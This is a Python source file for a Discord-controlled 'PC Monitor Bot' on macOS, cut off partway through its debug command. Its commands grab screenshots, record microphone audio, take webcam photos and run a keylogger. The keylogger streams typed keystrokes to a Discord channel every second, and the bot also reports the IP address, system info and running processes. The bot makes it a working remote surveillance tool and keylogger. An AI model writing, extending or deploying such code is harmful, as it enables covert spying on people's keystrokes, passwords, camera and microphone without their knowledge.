# importing packages
import os
import discord
from discord.ext import commands
try:
    from dotenv import load_dotenv
except ImportError:
    try:
        from python_dotenv import load_dotenv
    except ImportError:
        raise ImportError("Neither 'dotenv' nor 'python_dotenv' could be imported. Please ensure 'python-dotenv' is installed in your environment.")
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
from datetime import datetime
import asyncio
import psutil
import cv2
import platform
import socket
import time
import webbrowser
import subprocess
from pynput import keyboard
import threading
import json
import logging
from Quartz import (
    CGMainDisplayID,
    CGDisplayCreateImage,
    kCGNullWindowID,
    kCGWindowListOptionOnScreenOnly,
    CGWindowListCopyWindowInfo,
    kCGNullWindowID
)
import shutil
import traceback

# Set up
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('discord')

# load .env token
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    logger.error('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    print('DISCORD_TOKEN not found in environment variables. Please set it in your .env file.')
    exit(1)

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# variable for keylogger
keylogger_active = False
keylogger_data = []
keylogger_listener = None
keylogger_channel = None
last_send_time = 0

# def func
def take_screenshot():
    """Take a screenshot and save it to a file. Returns the file path."""
    from PIL import ImageGrab
    screenshot = ImageGrab.grab()
    screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot.save(screenshot_path)
    return screenshot_path

def record_audio(duration=10, sample_rate=44100):
    """Record audio from the microphone and save to a file. Returns the file path."""
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    audio_path = f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav'
    wav.write(audio_path, sample_rate, recording)
    return audio_path

def get_system_info():
    """Get basic system information as a string."""
    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"Python: {platform.python_version()}"
    return system_info

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_uptime():
    uptime = time.time() - psutil.boot_time()
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    return f"{hours}h {minutes}m {seconds}s"

def get_top_processes(limit=10):
    # List of common processes to exclude
    system_processes = {
        'WindowServer', 'kernel_task', 'launchd', 'logd', 'UserEventAgent', 'fseventsd',
        'mediaremoted', 'systemstats', 'configd', 'powerd', 'IOMFB_bics_daemo', 'syslogd',
        'notifyd', 'distnoted', 'securityd', 'hidd', 'coreaudiod', 'diskarbitrationd',
        'bluetoothd', 'airportd', 'cfprefsd', 'mds', 'mdworker', 'mds_stores', 'opendirectoryd',
        'iconservicesagent', 'iconservicesd', 'usbd', 'launchservicesd', 'warmd', 'sandboxd',
        'tccd', 'trustd', 'appleeventsd', 'corebrightnessd', 'locationd', 'sharingd', 'lsd',
        'Dock', 'Finder', 'SystemUIServer', 'loginwindow', 'remoted', 'sharingd', 'spindump',
        'ReportCrash', 'backupd', 'com.apple.WebKit.WebContent', 'com.apple.WebKit.Networking',
        'com.apple.WebKit.GPU', 'com.apple.Safari', 'com.apple.Safari.SafeBrowsing.Service',
        'com.apple.SafariBookmarksSyncAgent', 'com.apple.SafariCloudHistoryPushAgent',
        'com.apple.SafariHistory', 'com.apple.SafariLaunchAgent', 'com.apple.SafariPlugInUpdateNotifier',
        'com.apple.SafariServices', 'com.apple.SafariShared', 'com.apple.SafariWebContent',
        'com.apple.SafariWebContent.Development', 'com.apple.SafariWebContent.Network',
        'com.apple.SafariWebContent.Preheated', 'com.apple.SafariWebContent.Service',
        'com.apple.SafariWebContent.WebProcess', 'com.apple.SafariWebKit',
    }
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            info = proc.info
            name = info.get('name', '')
            if name in system_processes:
                continue
            mem = info.get('memory_info')
            rss = mem.rss if mem else 0
            processes.append({'name': name, 'pid': info['pid'], 'rss': rss})
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    processes.sort(key=lambda x: x['rss'], reverse=True)
    return processes[:limit]

def take_webcam_photo(warmup_seconds: float = 0.3):
    """Open the webcam, wait briefly to allow exposure/focus to settle, then capture a photo."""
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    try:
        # Allow the camera to warm up
        time.sleep(warmup_seconds)
        # Capture frame after warmup
        ret, frame = cap.read()
        if not ret or frame is None:
            return None
        photo_path = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(photo_path, frame)
        return photo_path
    finally:
        cap.release()

import Quartz

NSEvent = Quartz.NSEvent
NSSystemDefined = 14
NX_KEYTYPE_PLAY = 16
NX_KEYTYPE_NEXT = 17
NX_KEYTYPE_PREVIOUS = 18

def HIDPostAuxKey(key):
    def doKey(down):
        ev = NSEvent.otherEventWithType_location_modifierFlags_timestamp_windowNumber_context_subtype_data1_data2_(
            NSSystemDefined,
            (0, 0),
            0xa00 if down else 0xb00,
            0, 0, 0,
            8,
            (key << 16) | ((0xa if down else 0xb) << 8),
            -1
        )
        cev = ev.CGEvent()
        Quartz.CGEventPost(0, cev)
    doKey(True)
    doKey(False)

def control_media(action: str):
    """Control media playback using Quartz media keys.
    
    Returns (success: bool, message: str)
    """
    action = action.lower()
    
    try:
        if action == 'play':
            HIDPostAuxKey(NX_KEYTYPE_PLAY)
            return True, "Play/Pause command sent"
        elif action == 'next':
            HIDPostAuxKey(NX_KEYTYPE_NEXT)
            return True, "Next track command sent"
        elif action == 'prev':
            HIDPostAuxKey(NX_KEYTYPE_PREVIOUS)
            return True, "Previous track command sent"
        else:
            return False, f"Unsupported action: {action}"
    except Exception as e:
        logger.error(f"Error with media control: {str(e)}")
        return False, f"Failed to send media command: {str(e)}"

def set_volume(level):
    """Set system volume (macOS) to a value between 0 and 100."""
    try:
        level = int(level)
        if not (0 <= level <= 100):
            raise ValueError("Volume must be between 0 and 100.")
        # smt abt osascript dk
        subprocess.run(['osascript', '-e', f'set volume output volume {level}'])
        return True, level
    except Exception as e:
        return False, str(e)

def is_process_running(candidate_names):
    """Return True if any process name contains any of the candidate name substrings (case-insensitive)."""
    try:
        candidate_lower = [c.lower() for c in candidate_names]
        for proc in psutil.process_iter(['name']):
            name = (proc.info.get('name') or '').lower()
            if any(c in name for c in candidate_lower):
                return True
    except Exception:
        pass
    return False

def format_time_mm_ss(seconds_value: float) -> str:
    """Format seconds as MM:SS for display."""
    try:
        total_seconds = max(0, int(round(float(seconds_value))))
        minutes = total_seconds // 60
        seconds = total_seconds % 60
        return f"{minutes:02d}:{seconds:02d}"
    except Exception:
        return "00:00"

def get_spotify_playing_info():
    """Return a dict of now-playing info for Spotify, or None if unavailable."""
    if not is_process_running(['Spotify']):
        return None
    try:
        script = (
            'tell application "Spotify" to set out to '
            '(name of current track as text) & "\t" & '
            '(artist of current track as text) & "\t" & '
            '(album of current track as text) & "\t" & '
            '(duration of current track as text) & "\t" & '
            '(player position as text) & "\t" & '
            '(try artwork url of current track as text on error "" end try) & "\t" & '
            '(player state as text)\nreturn out'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 7:
            return None
        title, artist, album, duration_str, position_str, artwork_url, state = parts[:7]
        try:
            duration = float(duration_str)
            if duration > 10000:
                duration = duration / 1000.0
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0
        return {
            'app': 'Spotify',
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': artwork_url if artwork_url else None,
            'artwork_path': None,
        }
    except Exception:
        return None

def get_music_playing_info():
    """Return a dict of now-playing info for Music/iTunes, or None if unavailable."""
    target = 'Music' if is_process_running(['Music']) else ('iTunes' if is_process_running(['iTunes']) else None)
    if not target:
        return None
    try:
        info_script = (
            f'return (tell application "{target}" to '
            f'(name of current track as text) & "\t" & '
            f'(artist of current track as text) & "\t" & '
            f'(album of current track as text) & "\t" & '
            f'(duration of current track as text) & "\t" & '
            f'(player position as text) & "\t" & '
            f'(player state as text))'
        )
        result = subprocess.run(['osascript', '-e', info_script], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            return None
        raw = result.stdout.strip()
        if not raw:
            return None
        parts = raw.split('\t')
        if len(parts) < 6:
            return None
        title, artist, album, duration_str, position_str, state = parts[:6]
        try:
            duration = float(duration_str)
        except Exception:
            duration = 0.0
        try:
            position = float(position_str)
        except Exception:
            position = 0.0

        artwork_path = '/tmp/music_artwork.jpg'
        art_script = (
            'set outPath to POSIX file "' + artwork_path + '"\n'
            'tell application "' + target + '"\n'
            '    try\n'
            '        if (count of artworks of current track) > 0 then\n'
            '            set fileRef to open for access outPath with write permission\n'
            '            set eof of fileRef to 0\n'
            '            write (data of artwork 1 of current track) to fileRef\n'
            '            close access fileRef\n'
            '            return POSIX path of outPath\n'
            '        else\n'
            '            return ""\n'
            '        end if\n'
            '    on error\n'
            '        try\n'
            '            close access outPath\n'
            '        end try\n'
            '        return ""\n'
            '    end try\n'
            'end tell'
        )
        art_res = subprocess.run(['osascript', '-e', art_script], capture_output=True, text=True, check=False)
        art_out = art_res.stdout.strip() if art_res.returncode == 0 else ''
        if not art_out or not os.path.exists(artwork_path):
            artwork_path = None

        return {
            'app': target,
            'title': title,
            'artist': artist,
            'album': album,
            'duration': duration,
            'position': position,
            'state': state,
            'artwork_url': None,
            'artwork_path': artwork_path,
        }
    except Exception:
        return None

def get_media_playing_info():
    """Return now-playing info for Spotify or Music, preferring Spotify if both available."""
    info = get_spotify_playing_info()
    if info:
        return info
    info = get_music_playing_info()
    if info:
        return info
    # Fallback: try YouTube in common browsers
    info = get_youtube_playing_info()
    if info:
        return info
    return None

def _run_js_in_chromium_app(app_name: str, js: str) -> str:
    """Execute JavaScript in the active tab of the front window of a Chromium-based browser."""
    try:
        script = (f'tell application "{app_name}"\n'
                  f'  if (count of windows) = 0 then return ""\n'
                  f'  set theTab to active tab of front window\n'
                  f'  execute javascript "{js}" in theTab\n'
                  f'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari(js: str) -> str:
    """Execute JavaScript in the current tab of the front document in Safari."""
    try:
        script = ('tell application "Safari"\n'
                  '  if (count of documents) = 0 then return ""\n'
                  f'  do JavaScript "{js}" in current tab of front document\n'
                  'end tell')
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_chromium_app_any_youtube_tab(app_name: str, js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all windows of a Chromium-based browser."""
    try:
        script = (
            f'tell application "{app_name}"\n'
            '  set theResult to ""\n'
            '  if (count of windows) = 0 then return theResult\n'
            '  repeat with w in windows\n'
            '    repeat with t in tabs of w\n'
            '      set theUrl to (URL of t as text)\n'
            '      if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'        set theResult to execute javascript "{js}" in t\n'
            '        return theResult\n'
            '      end if\n'
            '    end repeat\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def _run_js_in_safari_any_youtube_tab(js: str) -> str:
    """Execute JavaScript in the first YouTube tab across all documents in Safari."""
    try:
        script = (
            'tell application "Safari"\n'
            '  set theResult to ""\n'
            '  if (count of documents) = 0 then return theResult\n'
            '  repeat with d in documents\n'
            '    set theUrl to (URL of d as text)\n'
            '    if theUrl contains "youtube.com" or theUrl contains "music.youtube.com" then\n'
            f'      set theResult to do JavaScript "{js}" in d\n'
            '      return theResult\n'
            '    end if\n'
            '  end repeat\n'
            '  return theResult\n'
            'end tell'
        )
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
        return result.stdout.strip() if result.returncode == 0 else ''
    except Exception:
        return ''

def get_youtube_playing_info():
    """Return now-playing info when YouTube is playing in Chrome/Brave/Edge/Vivaldi/Opera or Safari, else None."""
    # JavaScript to collect: position, duration, title, channel, url, artwork, state
    js = (
        "var v=document.querySelector('video');"
        "var url=location.href;"
        "var title=document.title||'';"
        "var chEl=document.querySelector('#owner-name a, ytd-channel-name a, ytd-video-owner-renderer a');"
        "var channel=chEl?chEl.textContent.trim():'';"
        "var id='';try{id=(new URL(url)).searchParams.get('v')||'';}catch(e){id='';}"
        "var art=id?('https://i.ytimg.com/vi/'+id+'/hqdefault.jpg'):'';"
        "var state=(v&& !v.paused)?'playing':(v?'paused':'stopped');"
        "(v?v.currentTime:0)+'\\t'+(v?v.duration:0)+'\\t'+title+'\\t'+channel+'\\t'+url+'\\t'+art+'\\t'+state;"
    )

    chromium_apps = [
        'Google Chrome',
        'Brave Browser',
        'Microsoft Edge',
        'Vivaldi',
        'Opera',
    ]

    # Try Chromium-based browsers first
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try any YouTube tab in Chromium browsers
    for app in chromium_apps:
        if is_process_running([app]):
            out = _run_js_in_chromium_app_any_youtube_tab(app, js)
            if out:
                parts = out.split('\t')
                if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                    try:
                        position = float(parts[0])
                    except Exception:
                        position = 0.0
                    try:
                        duration = float(parts[1])
                    except Exception:
                        duration = 0.0
                    title = parts[2]
                    channel = parts[3]
                    artwork_url = parts[5] if parts[5] else None
                    state = parts[6] if parts[6] else 'unknown'
                    return {
                        'app': f'YouTube ({app})',
                        'title': title,
                        'artist': channel or 'Unknown',
                        'album': 'YouTube',
                        'duration': duration,
                        'position': position,
                        'state': state,
                        'artwork_url': artwork_url,
                        'artwork_path': None,
                    }

    # Try Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }

    # Any YouTube tab in Safari
    if is_process_running(['Safari']):
        out = _run_js_in_safari_any_youtube_tab(js)
        if out:
            parts = out.split('\t')
            if len(parts) >= 7 and ('youtube.com' in parts[4] or 'music.youtube.com' in parts[4]):
                try:
                    position = float(parts[0])
                except Exception:
                    position = 0.0
                try:
                    duration = float(parts[1])
                except Exception:
                    duration = 0.0
                title = parts[2]
                channel = parts[3]
                artwork_url = parts[5] if parts[5] else None
                state = parts[6] if parts[6] else 'unknown'
                return {
                    'app': 'YouTube (Safari)',
                    'title': title,
                    'artist': channel or 'Unknown',
                    'album': 'YouTube',
                    'duration': duration,
                    'position': position,
                    'state': state,
                    'artwork_url': artwork_url,
                    'artwork_path': None,
                }
    return None

def _chromium_media_control(app_name: str, action: str) -> bool:
    # Uses Media Session JS API or key simulation inside the tab if possible
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_chromium_app(app_name, js)
    return out.strip().lower() == 'true'

def _safari_media_control(action: str) -> bool:
    js_map = {
        'play': "(()=>{var v=document.querySelector('video');if(!v)return false; if(v.paused){v.play();}else{v.pause();} return true;})()",
        'next': "(()=>{var btn=document.querySelector('.ytp-next-button, ytd-player .ytp-next-button'); if(btn){btn.click(); return true;} return false;})()",
        'prev': "(()=>{var btn=document.querySelector('.ytp-prev-button, ytd-player .ytp-prev-button'); if(btn){btn.click(); return true;} return false;})()",
    }
    js = js_map.get(action)
    if not js:
        return False
    out = _run_js_in_safari(js)
    return out.strip().lower() == 'true'

def _activate_app(app_name: str) -> bool:
    try:
        result = subprocess.run(['osascript', '-e', f'tell application "{app_name}" to activate'], capture_output=True, text=True, check=False)
        return result.returncode == 0
    except Exception:
        return False


def control_youtube_media(action: str):
    """Attempt to control YouTube playback in common browsers. Returns (success, message)."""
    chromium_apps = ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']
    for app in chromium_apps:
        if is_process_running([app]):
            # Ensure we're on a YouTube tab
            check = _run_js_in_chromium_app(app, "location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
            if check.strip().lower() == 'true':
                if _chromium_media_control(app, action):
                    return True, f"Media action '{action}' sent to YouTube ({app})"
                # Fallback: try any YouTube tab across windows
                check_any = _run_js_in_chromium_app_any_youtube_tab(app, "location.href")
                if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                    if _chromium_media_control(app, action):
                        return True, f"Media action '{action}' sent to YouTube ({app}) via fallback"
                # Final fallback: activate app and simulate keystrokes
    if is_process_running(['Safari']):
        check = _run_js_in_safari("location.href.includes('youtube.com')||location.href.includes('music.youtube.com')")
        if check.strip().lower() == 'true':
            if _safari_media_control(action):
                return True, f"Media action '{action}' sent to YouTube (Safari)"
            check_any = _run_js_in_safari_any_youtube_tab("location.href")
            if check_any and ('youtube.com' in check_any or 'music.youtube.com' in check_any):
                if _safari_media_control(action):
                    return True, f"Media action '{action}' sent to YouTube (Safari) via fallback"
    return False, "No supported media tab is active"

def on_key_press(key):
    global last_send_time
    if keylogger_active:
        try:
            current_time = time.time()
            
            # add keys to the buffer
            if key == keyboard.Key.space:
                keylogger_data.append('[SPACE]')
            elif key == keyboard.Key.enter:
                keylogger_data.append('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                if keylogger_data:
                    keylogger_data.pop()
            elif key == keyboard.Key.tab:
                keylogger_data.append('[TAB]')
            elif hasattr(key, 'char'):
                keylogger_data.append(key.char)
            else:
                keylogger_data.append(f'[{str(key)}]')
            
            # If one second has passed frm last send, send data and reset
            if current_time - last_send_time >= 1.0:
                if keylogger_channel and keylogger_data:
                    asyncio.run_coroutine_threadsafe(
                        keylogger_channel.send(f"```{''.join(keylogger_data)}```"),
                        bot.loop
                    )
                    keylogger_data.clear()  # reset buffer
                    last_send_time = current_time
                
        except Exception as e:
            logger.error(f"Error in keylogger: {str(e)}")

def check_camera_permission():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return False
    cap.release()
    return True

def check_microphone_permission():
    try:
        sd.check_input_settings()
        return True
    except Exception:
        return False

# debug error reporting
async def send_error(ctx, context, error):
    """Send a formatted error message to Discord and log it."""
    logger.error(f"Error in {context}: {str(error)}")
    await ctx.send(f"[Error in {context}] {str(error)}")

# Bot Commands
@bot.event
async def on_ready():
    logger.info(f'Bot is ready! Logged in as {bot.user.name}')
    try:
        synced_global = await bot.tree.sync()
        logger.info(f'Synced {len(synced_global)} global command(s)')
        # Force per-guild sync for immediate updates to choices/options
        for guild in bot.guilds:
            try:
                synced_guild = await bot.tree.sync(guild=guild)
                logger.info(f"Synced {len(synced_guild)} guild command(s) for guild {guild.name} ({guild.id})")
            except Exception as e:
                logger.error(f"Failed to sync guild commands for {guild.name} ({guild.id}): {e}")
    except Exception as e:
        logger.error(f'Failed to sync commands: {e}')
    
    # Find the "pc-monitor" channel specifically
    target_channel = None
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name == "pc-monitor":
                target_channel = channel
                break
        if target_channel:
            break
    
    # If pc-monitor channel found, send message there
    if target_channel:
        try:
            await target_channel.send(f"🤖 PC Monitor Bot is online! Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
            # perm check
            if not check_camera_permission():
                await target_channel.send("⚠️ [Warning] Camera permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Camera.")
            if not check_microphone_permission():
                await target_channel.send("⚠️ [Warning] Microphone permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Microphone.")
        except discord.Forbidden:
            logger.error("No permission to send messages in pc-monitor channel")
        except Exception as e:
            logger.error(f"Error sending ready message to pc-monitor channel: {str(e)}")
    else:
        logger.warning("pc-monitor channel not found. Bot is ready but no startup message sent.")
        # Fallback: send to first available channel
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(f"🤖 PC Monitor Bot is online! (pc-monitor channel not found) Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
                    return
                except discord.Forbidden:
                    continue
                except Exception as e:
                    logger.error(f"Error sending fallback ready message: {str(e)}")
                    continue

@bot.event
async def on_message(message):
    logger.info(f'Received message: {message.content} from {message.author}')
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@bot.tree.command(name='help', description='Show all available commands')
async def help_command(interaction: discord.Interaction):
    help_text = """
**PC Monitor Bot Commands**
/ss - Take a screenshot
/mic - Record audio from the microphone
/media - Control media playback (play/pause/next/prev)
/volume - Set system volume (0-100%)
/keylogger - Start or stop the keylogger
/sysinfo - Show system information
/ip - Show IP address
/uptime - Show system uptime
/processes - Show top 10 processes by memory usage (RSS)
/camera - Take a webcam photo
/all - Run all monitoring commands
/debug - Check the status of screenshot, audio recording, camera, and key system functions
"""
    await interaction.response.send_message(help_text)

@bot.tree.command(name='ss', description='Take a screenshot of the current screen')
async def screenshot(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
    except Exception as e:
        logger.error(f"Error in screenshot: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
        else:
            await interaction.followup.send(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
    finally:
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.tree.command(name='mic', description='Record 10 seconds of audio from the microphone')
async def record(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        logger.error(f"Error recording audio: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error recording audio: {str(e)}")
        else:
            await interaction.followup.send(f"Error recording audio: {str(e)}")

@bot.tree.command(name='media', description='Control media playback using system media keys')
@discord.app_commands.describe(action='Media action to perform')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Play/Pause', value='play'),
    discord.app_commands.Choice(name='Next Track', value='next'),
    discord.app_commands.Choice(name='Previous Track', value='prev')
])
async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    """Simple and reliable media control using pyautogui media keys."""
    try:
        success, message = control_media(action.value)
        
        if success:
            await interaction.response.send_message(f"🎵 {message}")
        else:
            await interaction.response.send_message(f"⚠️ {message}")
            
    except Exception as e:
        logger.error(f"Error in media command: {str(e)}")
        await interaction.response.send_message(f"⚠️ Error controlling media: {str(e)}")

@bot.tree.command(name='volume', description='Set system volume')
@discord.app_commands.describe(level='Volume level (0-100)')
async def volume(interaction: discord.Interaction, level: int):
    success, result = set_volume(level)
    if success:
        await interaction.response.send_message(f"🔊 Volume set to {result}%")
    else:
        await interaction.response.send_message(f"Error setting volume: {result}")

@bot.tree.command(name='keylogger', description='Start or stop the keylogger')
@discord.app_commands.describe(action='Keylogger action')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Start', value='start'),
    discord.app_commands.Choice(name='Stop', value='stop')
])
async def toggle_keylogger(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
    try:
        if action.value == 'start':
            if not keylogger_active:
                keylogger_active = True
                keylogger_data.clear()
                keylogger_channel = interaction.channel
                last_send_time = time.time()
                keylogger_listener = keyboard.Listener(on_press=on_key_press)
                keylogger_listener.start()
                await interaction.response.send_message("⌨️ Keylogger started - sending keystrokes every second")
            else:
                await interaction.response.send_message("Keylogger is already running")
        elif action.value == 'stop':
            if keylogger_active:
                keylogger_active = False
                if keylogger_listener:
                    keylogger_listener.stop()
                    keylogger_listener = None
                # send remaining data before stop
                if keylogger_channel and keylogger_data:
                    await interaction.response.send_message(f"```{''.join(keylogger_data)}```")
                else:
                    await interaction.response.send_message("⌨️ Keylogger stopped")
                keylogger_data.clear()
                keylogger_channel = None
            else:
                await interaction.response.send_message("Keylogger is not running")
    except Exception as e:
        logger.error(f"Error with keylogger: {str(e)}")
        await interaction.response.send_message(f"Error with keylogger: {str(e)}")

@bot.tree.command(name='sysinfo', description='Show detailed system information')
async def system_info(interaction: discord.Interaction):
    try:
        info = get_system_info()
        await interaction.response.send_message(f"💻 System Info:\n```{info}```")
    except Exception as e:
        logger.error(f"Error getting system info: {str(e)}")
        await interaction.response.send_message(f"Error getting system info: {str(e)}")

@bot.tree.command(name='ip', description='Show the system IP address')
async def ip_address(interaction: discord.Interaction):
    try:
        ip = get_ip_address()
        await interaction.response.send_message(f"🌐 IP Address: {ip}")
    except Exception as e:
        logger.error(f"Error getting IP address: {str(e)}")
        await interaction.response.send_message(f"Error getting IP address: {str(e)}")

@bot.tree.command(name='uptime', description='Show system uptime')
async def uptime(interaction: discord.Interaction):
    try:
        uptime_str = get_uptime()
        await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
    except Exception as e:
        logger.error(f"Error getting uptime: {str(e)}")
        await interaction.response.send_message(f"Error getting uptime: {str(e)}")

@bot.tree.command(name='processes', description='Show top 10 processes by memory usage')
async def processes(interaction: discord.Interaction):
    try:
        processes = get_top_processes()
        top_processes = "Top 10 processes by memory usage (RSS):\n"
        for proc in processes:
            mb = proc['rss'] / (1024 * 1024)
            top_processes += f"{proc['name']} (PID {proc['pid']}): {mb:.2f} MB\n"
        await interaction.response.send_message(f"📊 ```{top_processes}```")
    except Exception as e:
        logger.error(f"Error getting processes: {str(e)}")
        await interaction.response.send_message(f"Error getting processes: {str(e)}")

@bot.tree.command(name='camera', description='Take a photo using the webcam')
async def camera(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
        else:
            await interaction.followup.send("Failed to capture webcam photo")
    except Exception as e:
        logger.error(f"Error capturing from camera: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error capturing from camera: {str(e)}")
        else:
            await interaction.followup.send(f"Error capturing from camera: {str(e)}")

@bot.tree.command(name='all', description='Run all monitoring commands')
async def execute_all(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        results = []
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
        os.remove(screenshot_path)
        results.append("✓ Screenshot")
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
        results.append("✓ Audio recording")
        system_info = get_system_info()
        await interaction.followup.send(f"💻 System Info:\n```{system_info}```")
        results.append("✓ System info")
        ip = get_ip_address()
        await interaction.followup.send(f"🌐 IP Address: {ip}")
        results.append("✓ IP address")
        uptime_str = get_uptime()
        await interaction.followup.send(f"⏱️ Uptime: {uptime_str}")
        results.append("✓ Uptime")
        processes = get_top_processes()
        top_processes = "Top 10 processes by memory usage (RSS):\n"
        for proc in processes:
            mb = proc['rss'] / (1024 * 1024)
            top_processes += f"{proc['name']} (PID {proc['pid']}): {mb:.2f} MB\n"
        await interaction.followup.send(f"📊 ```{top_processes}```")
        results.append("✓ Process list")
        photo_path = take_webcam_photo()
        if photo_path:
            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
            os.remove(photo_path)
            results.append("✓ Webcam photo")
        summary = "All functions executed:\n" + "\n".join(results)
        await interaction.followup.send(f"```{summary}```")
    except Exception as e:
        logger.error(f"Error in execute_all: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error executing all functions: {str(e)}")
        else:
            await interaction.followup.send(f"Error executing all functions: {str(e)}")

@bot.tree.command(name='debug', description='Test all system functions')
async def debug(interaction: discord.Interaction):
    await interaction.response.defer()
    results = []
    # ss test
    try:
        path = take_screenshot()
        results.append('🟢 Screenshot: OK')
        os.remove(path)
